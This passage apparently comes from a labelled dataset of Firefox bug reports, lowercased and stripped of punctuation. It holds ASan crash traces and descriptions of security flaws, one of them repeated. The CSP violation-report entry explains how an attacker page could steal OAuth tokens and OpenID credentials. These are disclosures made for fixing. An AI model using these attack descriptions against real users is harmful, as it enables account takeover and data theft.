firefox/src/js/src/jsinterp.cpp:267 34 in js invokekernel jscontext js callargs js maybeconstruct firefox/src/js/src/jsinterp.cpp:322 35 in js invoke jscontext js invokeargsguard js maybeconstruct firefox/src/js/src/jsinterp.h:100 36 in js invoke jscontext js value const js value const unsigned int js value js value firefox/src/js/src/jsinterp.cpp:354 37 in js_callfunctionvalue firefox/src/js/src/jsapi.cpp:5490 38 in nsxpcwrappedjsclass callmethod nsxpcwrappedjs unsigned short xptmethoddescriptor const nsxptcminivariant firefox/src/js/xpconnect/src/xpcwrappedjsclass.cpp:1475 39 in nsxpcwrappedjs callmethod unsigned short xptmethoddescriptor const nsxptcminivariant firefox/src/js/xpconnect/src/xpcwrappedjs.cpp:579 40 in prepareanddispatch firefox/src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:121 41 in sharedstub firefox/src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:0 42 in ns_invokebyindex_p firefox/src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:161 43 in callmethodhelper invoke firefox/src/js/xpconnect/src/xpcwrappednative.cpp:3107 44 in xpc_wn_callmethod jscontext unsigned int js value firefox/src/js/xpconnect/src/xpcwrappednativejsops.cpp:1500 45 in js calljsnative jscontext int jscontext unsigned int js value js callargs const firefox/src/js/src/jscntxtinlines.h:395 46 in js interpret jscontext js stackframe js interpmode firefox/src/js/src/jsinterp.cpp:2435 47 in js runscript jscontext jsscript js stackframe firefox/src/js/src/jsinterp.cpp:267 48 in js invokekernel jscontext js callargs js maybeconstruct firefox/src/js/src/jsinterp.cpp:322 49 in js invoke jscontext js invokeargsguard js maybeconstruct firefox/src/js/src/jsinterp.h:100 50 in js callorconstructboundfunction jscontext unsigned int js value firefox/src/js/src/jsfun.cpp:862 51 in js calljsnative jscontext int jscontext unsigned int js value js callargs const firefox/src/js/src/jscntxtinlines.h:395 52 in js invoke jscontext js invokeargsguard js maybeconstruct firefox/src/js/src/jsinterp.h:100 53 in js invoke jscontext js value const js value const unsigned int js value js value firefox/src/js/src/jsinterp.cpp:354 54 in js_callfunctionvalue firefox/src/js/src/jsapi.cpp:5490 55 in nsxpcwrappedjsclass callmethod nsxpcwrappedjs unsigned short xptmethoddescriptor const nsxptcminivariant firefox/src/js/xpconnect/src/xpcwrappedjsclass.cpp:1475 56 in nsxpcwrappedjs callmethod unsigned short xptmethoddescriptor const nsxptcminivariant firefox/src/js/xpconnect/src/xpcwrappedjs.cpp:579 57 in prepareanddispatch firefox/src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:121 58 in sharedstub firefox/src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:0 59 in nsthread processnextevent bool bool firefox/src/xpcom/threads/nsthread.cpp:625 60 in ns_processnextevent_p nsithread bool firefox/src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:216 61 in mozilla ipc messagepump run base messagepump delegate firefox/src/ipc/glue/messagepump.cpp:82 62 in messageloop runinternal firefox/src/ipc/chromium/src/base/message_loop.cc:209 63 in messageloop runhandler firefox/src/ipc/chromium/src/base/message_loop.cc:202 is located 4 bytes to the right of 184-byte region allocated by thread t0 here 0 in malloc 0 1 in moz_xmalloc firefox/src/memory/mozalloc/mozalloc.cpp:54 2 in nstarrayinfallibleallocator malloc unsigned long firefox/src dist/include/nstarray.h:56 3 in nstarray_base nstarrayinfallibleallocator ensurecapacity unsigned int unsigned int firefox/src dist/include/nstarray-inl.h:119 4 in nstarray animationpropertysegment nstarrayinfallibleallocator appendelements unsigned int firefox/src dist/include/nstarray.h:891 5 in nstarray animationpropertysegment nstarrayinfallibleallocator appendelement firefox/src dist/include/nstarray.h:906 6 in nsanimationmanager buildsegment infallibletarray animationpropertysegment nscssproperty nsanimation const float nsstylecontext mozilla css declaration float nsstylecontext firefox/src/layout/style/nsanimationmanager.cpp:805 7 in nsanimationmanager buildanimations nsstylecontext infallibletarray elementanimation firefox/src/layout/style/nsanimationmanager.cpp:746 8 in nsanimationmanager checkanimationrule nsstylecontext mozilla dom element firefox/src/layout/style/nsanimationmanager.cpp:442 9 in nsstyleset getcontext nsstylecontext nsrulenode nsrulenode bool bool nsiatom nscsspseudoelements type bool mozilla dom element firefox/src/layout/style/nsstyleset.cpp:618 10 in nsstyleset resolvestylefor mozilla dom element nsstylecontext treematchcontext firefox/src/layout/style/nsstyleset.cpp:953 11 in nscssframeconstructor resolvestylecontext nsstylecontext nsicontent nsframeconstructorstate firefox/src/layout/base/nscssframeconstructor.cpp:4546 12 in nscssframeconstructor resolvestylecontext nsiframe nsicontent nsframeconstructorstate firefox/src/layout/base/nscssframeconstructor.cpp:4533 13 in nscssframeconstructor addframeconstructionitems nsframeconstructorstate nsicontent bool nsiframe nscssframeconstructor frameconstructionitemlist firefox/src/layout/base/nscssframeconstructor.cpp:4986 14 in nscssframeconstructor contentappended nsicontent nsicontent bool firefox/src/layout/base/nscssframeconstructor.cpp:6552 15 in nscssframeconstructor createneededframes nsicontent firefox/src/layout/base/nscssframeconstructor.cpp:6244 16 in nscssframeconstructor createneededframes nsicontent firefox/src/layout/base/nscssframeconstructor.cpp:6256 17 in nscssframeconstructor createneededframes firefox/src/layout/base/nscssframeconstructor.cpp:6270 18 in presshell flushpendingnotifications mozflushtype firefox/src/layout/base/nspresshell.cpp:3813 19 in nsdocument flushpendingnotifications mozflushtype firefox/src/content/base/src/nsdocument.cpp:6297 20 in nsdocloader docloaderisempty bool firefox/src/uriloader/base/nsdocloader.cpp:775 21 in nsdocloader onstoprequest nsirequest nsisupports unsigned int firefox/src/uriloader/base/nsdocloader.cpp:704 22 in non-virtual thunk to nsdocloader onstoprequest nsirequest nsisupports unsigned int firefox/src/modules/zlib/src/inffast.c:0 32187 aborting stats 148m malloced 160m for red zones by 338879 calls stats 44m realloced by 18848 calls stats 111m freed by 216201 calls stats 0m really freed by 0 calls stats 340m 87089 full pages mmaped in 85 calls mmaps by size class 8:262128 9:49146 10:20475 11:18423 12:3072 13:2048 14:1536 15:384 16:512 17:128 18:160 19:56 20:16 mallocs by size class 8:254257 9:45545 10:15976 11:16377 12:2361 13:1796 14:1413 15:319 16:512 17:111 18:149 19:49 20:14 frees by size class 8:150107 9:35624 10:12657 11:13226 12:1528 13:913 14:1224 15:268 16:443 17:97 18:57 19:46 20:11 rfrees by size class stats malloc large 323 small slow 1782 shadow byte and word fb 00 00 00 00 00 00 00 fb more shadow bytes fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa	11
object.defineproperty can shadow top filing a new bug as requested by boris in bug 756719 comment 10 with bug 750307 fixed the location property itself seems to be hardened well enough but plugins may try to access it through top.location for instance adobe flash player opens javascript top.location flashplugin_unique to determine the page origin and it is possible to shadow top using object.defineproperty incidentally google chrome seems to disallow redefining top	2
xraywrapper pollution via unsafe cow when installtrigger fails it throws an error wrapped in a chrome object wrapper it does n't specify exposedprops so it s unsafe by default an attacker may append custom-tailored exposedprops at the bottom of the error s prototype chain in object.prototype thus exposing privileged functions of object or function function seems to be guarded well it throws not allowed to access chrome eval or function from content but object has things like defineproperty or definegetter and they can be exploited to pollute the xraywrapper of the content window	2
out of bounds read in iscsswordspacingspace reproduces on trunk run testcase from command line you also need the empty test.js as in archive 20120617120215 27356 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 1 at thread t0 0 in nstextfragment charat int const firefox/src/modules/zlib/src/inffast.c:0 1 in iscsswordspacingspace nstextfragment const unsigned int nsstyletext const firefox/src/layout/generic/nstextframethebes.cpp:624 2 in propertyprovider getspacinginternal unsigned int unsigned int gfxfont spacing bool firefox/src/layout/generic/nstextframethebes.cpp:2817 3 in propertyprovider getspacing unsigned int unsigned int gfxfont spacing firefox/src/layout/generic/nstextframethebes.cpp:2776 4 in getadjustedspacing gfxtextrun unsigned int unsigned int gfxtextrun propertyprovider gfxfont spacing firefox/src/gfx/thebes/gfxfont.cpp:4489 5 in gfxtextrun breakandmeasuretext unsigned int unsigned int bool double gfxtextrun propertyprovider bool double gfxfont runmetrics gfxfont boundingboxtype gfxcontext bool unsigned int bool gfxbreakpriority firefox/src/gfx/thebes/gfxfont.cpp:4866 6 in nstextframe reflowtext nslinelayout int nsrenderingcontext bool nshtmlreflowmetrics unsigned int firefox/src/layout/generic/nstextframethebes.cpp:7477 7 in nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics bool firefox/src/layout/generic/nslinelayout.cpp:836 8 in nsinlineframe reflowinlineframe nsprescontext nshtmlreflowstate const nsinlineframe inlinereflowstate nsiframe unsigned int firefox/src/layout/generic/nsinlineframe.cpp:680 9 in nsinlineframe reflowframes nsprescontext nshtmlreflowstate const nsinlineframe inlinereflowstate nshtmlreflowmetrics unsigned int firefox/src/layout/generic/nsinlineframe.cpp:543 10 in nsinlineframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int firefox/src/layout/generic/nsinlineframe.cpp:397 11 in nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics bool firefox/src/layout/generic/nslinelayout.cpp:824 12 in nsblockframe reflowinlineframe nsblockreflowstate nslinelayout nslinelist_iterator nsiframe linereflowstatus firefox/src/layout/generic/nsblockframe.cpp:3834 13 in nsblockframe doreflowinlineframes nsblockreflowstate nslinelayout nslinelist_iterator nsflowarearect int nsfloatmanager savedstate bool linereflowstatus bool firefox/src/layout/generic/nsblockframe.cpp:3630 14 in nsblockframe reflowinlineframes nsblockreflowstate nslinelist_iterator bool firefox/src/layout/generic/nsblockframe.cpp:3482 15 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool firefox/src/layout/generic/nsblockframe.cpp:2570 16 in nsblockframe reflowdirtylines nsblockreflowstate firefox/src/layout/generic/nsblockframe.cpp:2020 17 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int firefox/src/layout/generic/nsblockframe.cpp:1069 18 in nsblockreflowcontext reflowblock nsrect const bool nscollapsingmargin int bool nslinebox nshtmlreflowstate unsigned int nsblockreflowstate firefox/src/layout/generic/nsblockreflowcontext.cpp:262 19 in nsblockframe reflowblockframe nsblockreflowstate nslinelist_iterator bool firefox/src/layout/generic/nsblockframe.cpp:3206 20 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool firefox/src/layout/generic/nsblockframe.cpp:2514 21 in nsblockframe reflowdirtylines nsblockreflowstate firefox/src/layout/generic/nsblockframe.cpp:2020 22 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int firefox/src/layout/generic/nsblockframe.cpp:1069 23 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker firefox/src/layout/generic/nscontainerframe.cpp:906 24 in nshtmlscrollframe reflowscrolledframe scrollreflowstate bool bool nshtmlreflowmetrics bool firefox/src/layout/generic/nsgfxscrollframe.cpp:516 25 in nshtmlscrollframe reflowcontents scrollreflowstate nshtmlreflowmetrics const firefox/src/layout/generic/nsgfxscrollframe.cpp:616 26 in nshtmlscrollframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int firefox/src/layout/generic/nsgfxscrollframe.cpp:857 27 in nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics bool firefox/src/layout/generic/nslinelayout.cpp:824 28 in nsblockframe reflowinlineframe nsblockreflowstate nslinelayout nslinelist_iterator nsiframe linereflowstatus firefox/src/layout/generic/nsblockframe.cpp:3834 29 in nsblockframe doreflowinlineframes nsblockreflowstate nslinelayout nslinelist_iterator nsflowarearect int nsfloatmanager savedstate bool linereflowstatus bool firefox/src/layout/generic/nsblockframe.cpp:3630 30 in nsblockframe reflowinlineframes nsblockreflowstate nslinelist_iterator bool firefox/src/layout/generic/nsblockframe.cpp:3482 31 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool firefox/src/layout/generic/nsblockframe.cpp:2570 32 in nsblockframe reflowdirtylines nsblockreflowstate firefox/src/layout/generic/nsblockframe.cpp:2020 33 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int firefox/src/layout/generic/nsblockframe.cpp:1069 34 in nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics bool firefox/src/layout/generic/nslinelayout.cpp:824 35 in nsblockframe reflowinlineframe nsblockreflowstate nslinelayout nslinelist_iterator nsiframe linereflowstatus firefox/src/layout/generic/nsblockframe.cpp:3834 36 in nsblockframe doreflowinlineframes nsblockreflowstate nslinelayout nslinelist_iterator nsflowarearect int nsfloatmanager savedstate bool linereflowstatus bool firefox/src/layout/generic/nsblockframe.cpp:3665 37 in nsblockframe reflowinlineframes nsblockreflowstate nslinelist_iterator bool firefox/src/layout/generic/nsblockframe.cpp:3482 38 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool firefox/src/layout/generic/nsblockframe.cpp:2570 39 in nsblockframe reflowdirtylines nsblockreflowstate firefox/src/layout/generic/nsblockframe.cpp:2020 40 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int firefox/src/layout/generic/nsblockframe.cpp:1069 41 in nsblockreflowcontext reflowblock nsrect const bool nscollapsingmargin int bool nslinebox nshtmlreflowstate unsigned int nsblockreflowstate firefox/src/layout/generic/nsblockreflowcontext.cpp:262 42 in nsblockframe reflowblockframe nsblockreflowstate nslinelist_iterator bool firefox/src/layout/generic/nsblockframe.cpp:3206 43 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool firefox/src/layout/generic/nsblockframe.cpp:2514 44 in nsblockframe reflowdirtylines nsblockreflowstate firefox/src/layout/generic/nsblockframe.cpp:2020 45 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int firefox/src/layout/generic/nsblockframe.cpp:1069 46 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker firefox/src/layout/generic/nscontainerframe.cpp:906 47 in nscanvasframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int firefox/src/layout/generic/nscanvasframe.cpp:429 48 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker firefox/src/layout/generic/nscontainerframe.cpp:906 49 in nshtmlscrollframe reflowscrolledframe scrollreflowstate bool bool nshtmlreflowmetrics bool firefox/src/layout/generic/nsgfxscrollframe.cpp:516 50 in nshtmlscrollframe reflowcontents scrollreflowstate nshtmlreflowmetrics const firefox/src/layout/generic/nsgfxscrollframe.cpp:616 51 in nshtmlscrollframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int firefox/src/layout/generic/nsgfxscrollframe.cpp:857 52 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker firefox/src/layout/generic/nscontainerframe.cpp:906 53 in viewportframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int firefox/src/layout/generic/nsviewportframe.cpp:200 54 in presshell doreflow nsiframe bool firefox/src/layout/base/nspresshell.cpp:7382 55 in presshell processreflowcommands bool firefox/src/layout/base/nspresshell.cpp:7523 56 in presshell flushpendingnotifications mozflushtype firefox/src/layout/base/nspresshell.cpp:3852 57 in documentviewerimpl loadcomplete unsigned int firefox/src/layout/base/nsdocumentviewer.cpp:982 58 in nsdocshell endpageload nsiwebprogress nsichannel unsigned int firefox/src/docshell/base/nsdocshell.cpp:6241 59 in nsdocshell onstatechange nsiwebprogress nsirequest unsigned int unsigned int firefox/src/docshell/base/nsdocshell.cpp:6072 60 in non-virtual thunk to nsdocshell onstatechange nsiwebprogress nsirequest unsigned int unsigned int firefox/src/modules/zlib/src/inffast.c:0 61 in nsdocloader dofireonstatechange nsiwebprogress nsirequest int unsigned int firefox/src/uriloader/base/nsdocloader.cpp:1352 62 in nsdocloader dostopdocumentload nsirequest unsigned int firefox/src/uriloader/base/nsdocloader.cpp:930 63 in nsdocloader docloaderisempty bool firefox/src/uriloader/base/nsdocloader.cpp:822 is located 0 bytes to the right of 2-byte region allocated by thread t0 here 0 in malloc 0 1 in moz_xmalloc firefox/src/memory/mozalloc/mozalloc.cpp:54 2 in ns_alloc_p firefox/src/xpcom/base/nsmemoryimpl.cpp:163 3 in nsmemory alloc unsigned long firefox/src dist/include/nsmemory.h:36 4 in nstextfragment append unsigned short const unsigned int bool firefox/src/content/base/src/nstextfragment.cpp:382 5 in nsgenericdomdatanode settextinternal unsigned int unsigned int unsigned short const unsigned int bool characterdatachangeinfo details firefox/src/content/base/src/nsgenericdomdatanode.cpp:312 6 in nsgenericdomdatanode appendtext unsigned short const unsigned int bool firefox/src/content/base/src/nsgenericdomdatanode.cpp:858 7 in nshtml5treeoperation appendtexttotextnode unsigned short const unsigned int nsicontent nshtml5treeopexecutor firefox/src/parser/html/nshtml5treeoperation.cpp:140 8 in nshtml5treeoperation appendtext unsigned short const unsigned int nsicontent nshtml5treeopexecutor firefox/src/parser/html/nshtml5treeoperation.cpp:155 9 in nshtml5treeoperation perform nshtml5treeopexecutor nsicontent firefox/src/parser/html/nshtml5treeoperation.cpp:451 10 in nshtml5treeopexecutor runflushloop firefox/src/parser/html/nshtml5treeopexecutor.cpp:564 11 in nshtml5executorreflusher run firefox/src/parser/html/nshtml5treeopexecutor.cpp:63 12 in nsthread processnextevent bool bool firefox/src/xpcom/threads/nsthread.cpp:625 13 in ns_processnextevent_p nsithread bool firefox/src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:217 14 in mozilla ipc messagepump run base messagepump delegate firefox/src/ipc/glue/messagepump.cpp:82 15 in messageloop runinternal firefox/src/ipc/chromium/src/base/message_loop.cc:209 16 in messageloop runhandler firefox/src/ipc/chromium/src/base/message_loop.cc:202 17 in messageloop run firefox/src/ipc/chromium/src/base/message_loop.cc:176 18 in nsbaseappshell run firefox/src/widget/xpwidgets/nsbaseappshell.cpp:165 19 in nsappstartup run firefox/src/toolkit/components/startup/nsappstartup.cpp:256 20 in xremain xre_mainrun firefox/src/toolkit/xre/nsapprunner.cpp:3785 21 in xremain xre_main int char nsxreappdata const firefox/src/toolkit/xre/nsapprunner.cpp:3862 22 in xre_main firefox/src/toolkit/xre/nsapprunner.cpp:3938 27356 aborting stats 154m malloced 167m for red zones by 355141 calls stats 44m realloced by 19866 calls stats 114m freed by 225726 calls stats 0m really freed by 0 calls stats 352m 90162 full pages mmaped in 88 calls mmaps by size class 8:278511 9:57337 10:20475 11:18423 12:3072 13:2048 14:1536 15:384 16:576 17:128 18:160 19:56 20:16 mallocs by size class 8:265584 9:48356 10:17023 11:17025 12:2568 13:1904 14:1480 15:341 16:526 17:112 18:159 19:49 20:14 frees by size class 8:155781 9:37742 10:13552 11:13792 12:1632 13:994 14:1281 15:284 16:456 17:98 18:57 19:46 20:11 rfrees by size class stats malloc large 334 small slow 1873 shadow byte and word 2 02 fb fb fb fb fb fb fb more shadow bytes fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 02 fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00	11
content security policy violation reports leak oauth 2.0 and openid credentials the content security policy csp violation reports generated by firefox include sensitive data within the blocked-uri parameter in particular they include fragment components and query strings even if the blocked-uri has a different origin than the protected resource violating csp 1.1 recommendations hence a malicious website may use firefox s csp implementation to steal a user s oauth 2.0 access tokens and openid credentials this leads to serious attacks on popular social authorization servers such as facebook and google for example suppose a yahoo user has previously used sign in with facebook to log in to yahoo suppose also that the user is currently logged in to facebook she does not have to be logged in to yahoo if she then visits attacker.com this website can redirect her to facebook s oauth 2.0 endpoint requesting an access token for the current user at yahoo facebook issues a token and forwards the user to open.login.yahoo.com access_token=aaaxxx the key security mechanism of oauth 2.0 is that this access token will only be sent to yahoo so even if the original token request was sent by an attacker he will not be able to obtain the access token now suppose attacker.com had a csp that forbid connections to open.login.yahoo.com then firefox will send a csp violation report to report-uri that contains as its blocked-uri the full url open.login.yahoo.com access_token=aaaxxx hence the attacker obtains the user s facebook access token at yahoo and may download sensitive user information from the facebook api for comparison chrome sends a blocked-uri that contains only the domain open.login.yahoo.com avoiding the attack a similar attack works for the facebook oauth 2.0 authorization code flow allowing the attacker to steal the auth code and potentially log in as the user on yahoo a similar attack works on the google openid interaction where the attacker obtains the user s name and email address from google and also a signed openid response that the attacker may potentially use to log in as the user to yahoo demo as a proof of concept we have built an attack webpage that silently retrieves and stores any visitor s names and email addresses from facebook and google the preconditions for this demonstration the visitor must be logged into facebook or google in the same browser and must have previously authorized yahoo to access his facebook or google profile by using sign in with facebook for example the demo is at karthik/csp/index.html causes and fixes the attack shown here was predicted for a fictionalized version of oauth by adam barth in our demo shows that it is an effective attack on real oauth and openid users such as those using the google facebook live linkedin and dropbox apis the root issue is that firefox does not implement the recommendations of csp 1.1 on violation reports section 4.15 implementing them would disable the attack above specifically firefox must remove the fragment component from the blocked uri this would prevent facebook access tokens from being leaked since the origin of the blocked-uri is not the same as the origin of the protected resource firefox should also removes the query string this would prevent the google openid identifiers from being leaked about us i lead a security research group called prosecco at inria in france our work focuses on formal security proofs for cryptographic and web applications we found this attack as part of a formal study of oauth maffeis/csf12.pdf we would welcome the opportunity to study any fixes you may propose and incorporate them into our analyses	9
xraywrapper pollution via unsafe cow when installtrigger fails it throws an error wrapped in a chrome object wrapper it does n't specify exposedprops so it s unsafe by default an attacker may append custom-tailored exposedprops at the bottom of the error s prototype chain in object.prototype thus exposing privileged functions of object or function function seems to be guarded well it throws not allowed to access chrome eval or function from content but object has things like defineproperty or definegetter and they can be exploited to pollute the xraywrapper of the content window	2
incorrect ev identity display loading new page identity not updated user agent mozilla/5.0 windows nt 6.1 wow64 rv:13.0 gecko/20100101 firefox/13.0.1 build id 20120614114901 steps to reproduce i ve bin changed form a one https encrypted website to another https encrypted one actual results on the address input box was still the certificate of the first website in green visible expected results on the address input box have to be the certificate of the second website	2
bad iterator in text runs reproduces on trunk the backiterator s line looks to be pointing to bad address nsblockframe line_iterator line backiterator.getline if backiterator.prev backiterator.getline isblock asan sigsegv 15447 error addresssanitizer crashed on unknown address pc sp bp t0 addresssanitizer can not provide additional info aborting 0 in nslinebox isblock const layout/base generic/nslinebox.h:225 1 in buildtextruns gfxcontext nstextframe nsiframe nslinelist_iterator const nstextframe textruntype layout/generic/nstextframethebes.cpp:1220 2 in nstextframe ensuretextrun nstextframe textruntype gfxcontext nsiframe nslinelist_iterator const unsigned int layout/generic/nstextframethebes.cpp:2391 3 in nstextframe addinlineminwidthforflow nsrenderingcontext nsiframe inlineminwidthdata nstextframe textruntype layout/generic/nstextframethebes.cpp:6594 4 in nstextframe addinlineminwidth nsrenderingcontext nsiframe inlineminwidthdata layout/generic/nstextframethebes.cpp:6746 5 in nscontainerframe doinlineintrinsicwidth nsrenderingcontext nsiframe inlineintrinsicwidthdata nslayoututils intrinsicwidthtype layout/generic/nscontainerframe.cpp:813 6 in nsfirstletterframe addinlineminwidth nsrenderingcontext nsiframe inlineminwidthdata layout/generic/nsfirstletterframe.cpp:122 7 in nslayoututils minwidthfrominline nsiframe nsrenderingcontext layout/base/nslayoututils.cpp:3009 8 in nsfirstletterframe getminwidth nsrenderingcontext layout/generic/nsfirstletterframe.cpp:137 9 in nsframe shrinkwidthtofit nsrenderingcontext int layout/generic/nsframe.cpp:3935 10 in nscontainerframe computeautosize nsrenderingcontext nssize int nssize nssize nssize bool layout/generic/nscontainerframe.cpp:860 11 in nsframe computesize nsrenderingcontext nssize int nssize nssize nssize unsigned int layout/generic/nsframe.cpp:3780 12 in nsfirstletterframe computesize nsrenderingcontext nssize int nssize nssize nssize unsigned int layout/generic/nsfirstletterframe.cpp:158 13 in floatmarginwidth nshtmlreflowstate const int nsiframe nscssoffsetstate const layout/generic/nsblockreflowstate.cpp:562 14 in nsblockreflowstate flowandplacefloat nsiframe layout/generic/nsblockreflowstate.cpp:608 15 in nsblockframe reflowpushedfloats nsblockreflowstate nsoverflowareas unsigned int layout/generic/nsblockframe.cpp:6017 16 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int layout/generic/nsblockframe.cpp:1057 17 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker layout/generic/nscontainerframe.cpp:906 18 in nscolumnsetframe reflowchildren nshtmlreflowmetrics nshtmlreflowstate const unsigned int nscolumnsetframe reflowconfig const bool nscollapsingmargin nscolumnsetframe columnbalancedata layout/generic/nscolumnsetframe.cpp:665 19 in nscolumnsetframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int layout/generic/nscolumnsetframe.cpp:920 20 in nsblockreflowcontext reflowblock nsrect const bool nscollapsingmargin int bool nslinebox nshtmlreflowstate unsigned int nsblockreflowstate layout/generic/nsblockreflowcontext.cpp:262 21 in nsblockframe reflowblockframe nsblockreflowstate nslinelist_iterator bool layout/generic/nsblockframe.cpp:3206 22 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool layout/generic/nsblockframe.cpp:2514 23 in nsblockframe reflowdirtylines nsblockreflowstate layout/generic/nsblockframe.cpp:2308 24 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int layout/generic/nsblockframe.cpp:1069 25 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker layout/generic/nscontainerframe.cpp:906 26 in nscolumnsetframe reflowchildren nshtmlreflowmetrics nshtmlreflowstate const unsigned int nscolumnsetframe reflowconfig const bool nscollapsingmargin nscolumnsetframe columnbalancedata layout/generic/nscolumnsetframe.cpp:665 27 in nscolumnsetframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int layout/generic/nscolumnsetframe.cpp:920 28 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker layout/generic/nscontainerframe.cpp:906 29 in nscanvasframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int layout/generic/nscanvasframe.cpp:429 30 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker layout/generic/nscontainerframe.cpp:906 31 in nshtmlscrollframe reflowscrolledframe scrollreflowstate bool bool nshtmlreflowmetrics bool layout/generic/nsgfxscrollframe.cpp:517 32 in nshtmlscrollframe reflowcontents scrollreflowstate nshtmlreflowmetrics const layout/generic/nsgfxscrollframe.cpp:617 33 in nshtmlscrollframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int layout/generic/nsgfxscrollframe.cpp:858 34 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker layout/generic/nscontainerframe.cpp:906 35 in viewportframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int layout/generic/nsviewportframe.cpp:200 36 in presshell doreflow nsiframe bool layout/base/nspresshell.cpp:7383 37 in presshell processreflowcommands bool layout/base/nspresshell.cpp:7524 38 in presshell flushpendingnotifications mozflushtype layout/base/nspresshell.cpp:3852 39 in nsrefreshdriver notify nsitimer layout/base/nsrefreshdriver.cpp:396 40 in nstimerimpl fire xpcom/threads/nstimerimpl.cpp:477 41 in nstimerevent run xpcom/threads/nstimerimpl.cpp:558 42 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:625 43 in ns_processnextevent_p nsithread bool objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:217 44 in nsxulwindow showmodal xpfe/appshell/src/nsxulwindow.cpp:378 45 in nscontenttreeowner showasmodal xpfe/appshell/src/nscontenttreeowner.cpp:529 46 in non-virtual thunk to nscontenttreeowner showasmodal modules/zlib/src/inffast.c:0 47 in nswindowwatcher openwindowjsinternal nsidomwindow char const char const char const bool nsiarray bool nsidomwindow embedding/components/windowwatcher/src/nswindowwatcher.cpp:1000 48 in nswindowwatcher openwindow nsidomwindow char const char const char const nsisupports nsidomwindow embedding/components/windowwatcher/src/nswindowwatcher.cpp:381 49 in ns_invokebyindex_p xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:161 50 in callmethodhelper call js/xpconnect/src/xpcwrappednative.cpp:2405 51 in xpc_wn_callmethod jscontext unsigned int js value js/xpconnect/src/xpcwrappednativejsops.cpp:1474 52 in js calljsnative jscontext int jscontext unsigned int js value js callargs const js/src/jscntxtinlines.h:400 53 in js interpret jscontext js stackframe js interpmode js/src/jsinterp.cpp:2437 54 in js runscript jscontext jsscript js stackframe js/src/jsinterp.cpp:267 55 in js invokekernel jscontext js callargs js maybeconstruct js/src/jsinterp.cpp:322 56 in js invoke jscontext js invokeargsguard js maybeconstruct js/src/jsinterp.h:100 57 in js invoke jscontext js value const js value const unsigned int js value js value js/src/jsinterp.cpp:354 58 in js_callfunctionvalue js/src/jsapi.cpp:5499 59 in nsxpcwrappedjsclass callmethod nsxpcwrappedjs unsigned short 